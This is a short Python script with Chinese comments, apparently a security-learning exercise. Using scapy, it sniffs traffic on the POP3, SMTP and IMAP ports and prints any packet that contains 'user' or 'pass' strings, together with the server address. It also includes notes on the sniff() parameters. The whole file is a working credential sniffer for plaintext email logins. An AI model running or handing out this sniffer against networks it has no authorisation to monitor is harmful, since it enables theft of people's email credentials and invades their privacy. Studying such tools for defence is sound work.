#-*- coding:utf8 -*-

from scapy.all import *


def packet_callback(packet):# 定义数据包回调函数

    if packet[TCP].payload:#检测数据包是否含有负载
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
        #检查相关命令,如果检测到了认证字符串,则输出该数据包的相关信息
            print("[*] Server: %s" % packet[IP].dst)
            print ("[*] %s" % packet[TCP].payload)
    # print packet.show()

# 开启嗅探器(对常见电子邮件端口进行嗅探１１０（ＰＯＰ３），　２５（ＳＭＴＰ），　１４３（ＩＭＡＰ), store=0:不保留原始数据包，长时间嗅探的话不会暂用太多内存
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)

""""
sniff(filter="",iface="any",prn=function,count=N)
    filter:指定一个wireshark过滤器,留空则嗅探所有的数据包
    iface:所要嗅探的网卡
    prn:符合过滤器条件的数据包时所调用的回调函数（这个回调函数以接收到的数据包对象作为唯一的参数）
    count:需要嗅探的数据包个数,留空则嗅探无限个
"""